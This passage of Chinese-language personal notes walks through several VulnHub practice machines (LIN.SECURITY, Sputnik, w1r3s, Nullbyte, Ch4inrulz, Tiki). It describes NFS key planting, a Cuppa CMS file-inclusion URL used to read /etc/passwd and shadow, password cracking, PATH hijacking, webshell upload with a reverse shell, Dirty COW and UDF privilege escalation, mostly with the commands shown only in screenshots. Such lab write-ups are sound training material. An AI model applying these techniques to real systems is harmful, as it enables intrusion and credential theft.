height="2.063850612423447in"}

反弹成功开始后渗透

找数据库密码文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image258.png){width="5.0in"
height="1.0520833333333333in"}

发现数据库密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image259.png){width="4.027777777777778in"
height="2.097366579177603in"}

登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image260.png){width="5.760416666666667in"
height="2.1944444444444446in"}

发现密码，接着爆破hash密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image261.png){width="5.760416666666667in"
height="2.3383136482939633in"}

百度是udf提权

搜索文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image262.png){width="5.760416666666667in"
height="2.447037401574803in"}

按照步骤使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image263.png){width="5.760416666666667in"
height="3.2163035870516183in"}

此处失败多次

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image264.png){width="5.760416666666667in"
height="3.533152887139108in"}

成功（可能是因为要把那个1518.so的权限提上来才可以成功）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image265.png){width="5.760416666666667in"
height="3.755148731408574in"}

提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image266.png){width="5.760416666666667in"
height="1.9649234470691164in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image267.png){width="5.760416666666667in"
height="1.6005260279965003in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image268.png){width="2.3472222222222223in"
height="0.6363582677165355in"}

#### **LIN.SECURITY: 1(nfs写私钥，nmap提权)**

靶机给了给bob用户和密码[secret进去看全是sudo提权可能是练习sudo提权的好靶机]{.mark}

信息收集：nmap扫描服务

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image269.png){width="5.760416666666667in"
height="2.81663823272091in"}

都不是后面端口

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image270.png){width="2.6805555555555554in"
height="3.9113167104111985in"}

就应该就nfs可以渗透了，试试看能不能直接使用共享目录看看有没有好东西

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image271.png){width="3.2916666666666665in"
height="1.3125in"}

使用mount 连接

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image272.png){width="5.569444444444445in"
height="2.6699956255468065in"}

可惜不是根目录，看起来有点像可以上传私钥然后ssh登录的感觉

先生成.ssh目录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image273.png){width="3.8333333333333335in"
height="1.6666666666666667in"}

生成不了

看这些目录的权限好像是要用户为1001，用户组为1005的用户才能完全使用这个目录就可以创建.ssh

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image274.png){width="5.180555555555555in"
height="2.3557458442694665in"}

创建一个perter用户然后再/etc/passwd里面修改UID和GID

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image275.png){width="5.760416666666667in"
height="1.3821139545056869in"}

再切换用户创建.ssh文件夹成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image276.png){width="5.760416666666667in"
height="2.5998337707786527in"}

然后生成并且上传公钥文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image277.png){width="5.760416666666667in"
height="0.5616524496937882in"}

成功登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image278.png){width="5.760416666666667in"
height="2.2155446194225723in"}

使用sudo -l发现一个没做过的sudo提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image279.png){width="5.760416666666667in"
height="0.7484951881014873in"}

只能百度了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image280.png){width="5.760416666666667in"
height="4.923040244969378in"}

提权成功，

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image281.png){width="5.5in"
height="1.1145833333333333in"}

#### **Sputnik: 1(git泄露，splunk渗透反弹，ed提权)**

信息收集：使用nmap扫描发现这个用了splunk

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image282.png){width="5.760416666666667in"
height="5.619428040244969in"}

访问55555端口

发现有个网页上面挂了个游戏而且不能抓包

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image283.png){width="5.760416666666667in"
height="3.880987532808399in"}

使用nikto发现有备份文件下载

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image284.png){width="5.760416666666667in"
height="2.162143482064742in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image285.png){width="5.760416666666667in"
height="0.8892639982502187in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image286.png){width="5.760416666666667in"
height="1.2648534558180227in"}

发现61337是splunk页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image287.png){width="5.760416666666667in"
height="1.8781036745406825in"}

试试弱密码不行

扫后台，搜寻用户和密码本或找splunk的版本号看看能不能直接日进去，可能那个游戏页面有密码之类的提示

扫8089的https后台

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image288.png){width="5.263888888888889in"
height="2.1472495625546806in"}

发现版本号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image289.png){width="5.760416666666667in"
height="1.4577384076990376in"}

并没有漏洞z

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image290.png){width="5.760416666666667in"
height="2.7752241907261594in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image291.png){width="5.760416666666667in"
height="0.672230971128609in"}

百度说是Git泄露

使用git log -p

查看日志

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image292.png){width="5.760416666666667in"
height="3.9782884951881017in"}

一直回车看下面发现有密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image293.png){width="4.222222222222222in"
height="1.4803838582677165in"}

这个靶机没有22端口要么是端口敲门要么就是直接反弹shell提权，这个靶机太靠互联网下载攻击软件了就不日了

#### **w1r3s:（cuppa CMS加curl）**

信息搜集

发现用户名是Jan，还有一个数据库的端口，估计应该是要去网页找密码爆破之类的

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image294.png){width="5.760416666666667in"
height="3.852649825021872in"}

再先看看ftp吧

把ftp里面的目录文件全下载下来查看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image295.png){width="5.760416666666667in"
height="6.7763976377952755in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image296.png){width="5.760416666666667in"
height="1.5230938320209975in"}

发现有几个好东西

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image297.png){width="5.760416666666667in"
height="5.347905730533683in"}

base64解密是

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image298.png){width="5.760416666666667in"
height="0.5898042432195976in"}

发现员工名单

The W1R3S.inc employee list

Naomi.W - Manager

Hector.A - IT Dept

Joseph.G - Web Design

Albert.O - Web Design

Gina.L - Inventory

Rico.D - Human Resources

一直访问wordpress，跳转到localhost修改hosts让他跳回去

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image299.png){width="5.236111111111111in"
height="1.8253379265091862in"}

终于找到登录页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image300.png){width="5.760416666666667in"
height="3.2927384076990376in"}

登录网页发现 cuppa cms

的应该网站初始化的样子，前提是输入对用户名和数据库的密码之类的说明要去找sql密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image301.png){width="5.760416666666667in"
height="4.052970253718285in"}

使用whatweb查看框架然后用查看有什么脚本可以利用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image302.png){width="5.760416666666667in"
height="3.0657884951881016in"}

发现了东西，可能就是那个初始化页面的漏洞套进去看看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image303.png){width="5.760416666666667in"
height="2.1888101487314087in"}

可惜这个套不了，可能是故意设置的所以我们使用什么的文件包含试试

http://target/cuppa/alerts/alertConfigField.php?urlConfig

http://172.16.123.110/administrator/alerts/alertConfigField.php?urlConfig

使用还是不成功，可能是url编码问题使用curl测试一下

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image304.png){width="5.760416666666667in"
height="0.16044291338582678in"}

成功包含/etc/passwd

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image305.png){width="5.760416666666667in"
height="5.282221128608924in"}

读取到shadow

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image306.png){width="5.760416666666667in"
height="4.081445756780402in"}

开始可以开始爆破了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image307.png){width="2.638888888888889in"
height="0.5319499125109362in"}

爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image308.png){width="5.760416666666667in"
height="2.7963845144356956in"}

ssh登录提权：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image309.png){width="5.760416666666667in"
height="2.6621850393700788in"}

#### **Nullbyte（ps环境变量提权）**

信息收集：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image310.png){width="5.760416666666667in"
height="2.2803302712160978in"}

没发现什么特殊端口

把主页照片保存下来strings发现有一串可疑字符

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image311.png){width="3.6527777777777777in"
height="1.2836909448818898in"}

base64解密失败，原来是网页路径

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image312.png){width="4.666666666666667in"
height="0.5729166666666666in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image313.png){width="5.760416666666667in"
height="0.8676629483814523in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image314.png){width="5.760416666666667in"
height="2.995736001749781in"}

爆破key成功

登录试试

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image315.png){width="5.760416666666667in"
height="2.0811832895888016in"}

发现是sql注入

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image316.png){width="5.760416666666667in"
height="2.6221555118110236in"}

爆出密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image317.png){width="5.760416666666667in"
height="1.2608300524934384in"}

使用phpmyadmin登录看看

登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image318.png){width="5.760416666666667in"
height="2.8300688976377955in"}

发现个base64的密码和用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image319.png){width="5.760416666666667in"
height="2.9186898512685913in"}

解密发现可能是md5

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image320.png){width="5.760416666666667in"
height="0.45666776027996503in"}

解密得到密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image321.png){width="5.760416666666667in"
height="1.9839074803149606in"}

ssh服务登录成功查看/etc/passwd

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image322.png){width="4.569444444444445in"
height="1.1553718285214347in"}

发现有其他用户也是bash有可能是要找其他的用户提权

发现可疑文件有s

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image323.png){width="5.416666666666667in"
height="4.229166666666667in"}

使用发现是ps的命令，说明是环境变量提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image324.png){width="4.652777777777778in"
height="1.0849529746281714in"}

写入提权命令

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image325.png){width="5.760416666666667in"
height="0.2010618985126859in"}

然后给顶替的/tmp/ps设置777的权限

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image326.png){width="4.819444444444445in"
height="0.34350284339457565in"}

把ps命令顶替在前面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image327.png){width="5.760416666666667in"
height="0.460498687664042in"}

环境变量提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image328.png){width="5.760416666666667in"
height="0.8583398950131234in"}

#### **Ch4inrulz（POST文件包含）**

信息收集dirb扫后台，发现一个要密码登录的页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image329.png){width="5.333333333333333in"
height="2.4270833333333335in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image330.png){width="5.760416666666667in"
height="2.1256332020997375in"}

由此可以分析要找到密码和用户才能进入

发现可疑页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image331.png){width="5.760416666666667in"
height="2.2310017497812775in"}

发现可以传file参数

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image332.png){width="5.760416666666667in"
height="1.6613801399825021in"}

get方式报错

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image333.png){width="5.760416666666667in"
height="2.502374234470691in"}

post方式可行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image334.png){width="5.760416666666667in"
height="2.740336832895888in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image335.png){width="5.760416666666667in"
height="4.510699912510936in"}

发现目录穿越

测试发现index.html.bak

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image336.png){width="5.760416666666667in"
height="1.5156342957130358in"}

改后缀打开发现用户和密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image337.png){width="5.760416666666667in"
height="2.6881944444444446in"}

使用john爆破出密码和用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image338.png){width="5.760416666666667in"
height="1.7453794838145231in"}

网页登录后发现没什么东西翻译发现是文件上传

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image339.png){width="5.760416666666667in"
height="1.4807338145231845in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image340.png){width="5.760416666666667in"
height="1.2566163604549432in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image341.png){width="5.760416666666667in"
height="3.1471937882764656in"}

试试ssh发现密码不能用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image342.png){width="5.760416666666667in"
height="2.0723009623797024in"}

上传木马找不到目录先用file读取这个upload.php的源码看看放哪了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image343.png){width="5.760416666666667in"
height="3.049420384951881in"}

bash64解密发现上传的路径

生成监听文件上传

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image344.png){width="5.760416666666667in"
height="0.6550010936132984in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image345.png){width="5.760416666666667in"
height="1.4055129046369204in"}

再使用burp的文件包含访问，成功反弹shell

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image346.png){width="5.760416666666667in"
height="2.88209208223972in"}

尝试脏牛的40616.c

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image347.png){width="4.444444444444445in"
height="1.1058945756780403in"}

再试试40839.c成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image348.png){width="5.760416666666667in"
height="4.098757655293088in"}

#### **Tiki**

信息收集发现开起了smb服务

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image349.png){width="5.760416666666667in"
height="2.95542104111986in"}

发现有robots.txt

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image350.png){width="5.361111111111111in"
height="1.6551782589676292in"}

发现是个CMS

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image351.png){width="5.760416666666667in"
height="1.7382961504811898in"}

初步估计是cms的漏洞

找到一个登录页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image352.png){width="5.760416666666667in"
height="3.2644411636045496in"}

一直没找到方法试试smb服务看看有没有关键信息

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image353.png){width="5.760416666666667in"
height="2.3735476815398076in"}

smb发现一个密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image354.png){width="5.760416666666667in"
height="3.5305774278215223in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image355.png){width="5.760416666666667in"
height="2.383620953630796in"}

登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image356.png){width="5.760416666666667in"
height="3.2561089238845145in"}

找了半天才发现版本号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image357.png){width="5.760416666666667in"
height="3.989165573053368in"}

没找到也没关系可以发现这个是20207月

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image358.png){width="5.760416666666667in"
height="0.932351268591426in"}

所以百度看一下这个tiki的版本

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image359.png){width="5.760416666666667in"
height="1.599076990376203in"}

[接着就按照脚本的方法在登录处用 admin 登录然后用 Burp 抓包就可]{.mark}

[burp抓包然后把密码删掉]{.mark}

然后跑脚本

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image360.png){width="5.760416666666667in"
height="3.2924070428696415in"}

一个一个发包最后一个包是这样的就成功了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image361.png){width="5.760416666666667in"
height="1.7352635608048994in"}

[发现真的登录成功了]{.mark}

[信息收集]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image362.png){width="5.760416666666667in"
height="3.561784776902887in"}

[发现密码]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image363.png){width="5.760416666666667in"
height="2.8515288713910762in"}

[sudo -l 发现是ALL可以轻松提权]{.mark}
